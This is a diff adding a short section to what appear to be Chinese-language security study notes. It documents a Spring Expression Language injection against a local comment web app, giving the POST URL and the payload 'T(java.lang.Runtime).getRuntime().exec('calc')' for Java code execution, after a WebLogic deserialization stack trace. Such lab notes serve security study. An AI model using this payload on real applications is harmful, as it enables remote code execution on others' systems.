@@ -149,3 +149,22 @@ readObject:1192, JtaTransactionManager (com.bea.core.repackaged.springframework.
     execute:256, ExecuteThread (weblogic.work)
     run:221, ExecuteThread (weblogic.work)
 ```
+
+## spel RCE
+
+tomecat启动后
+
+post请求
+
+```http
+http://localhost:8088/Rce_comment_war/comment
+```
+
+body为
+
+```
+comment=T(java.lang.Runtime).getRuntime().exec('calc')
+```
+
+实现Java代码执行
+
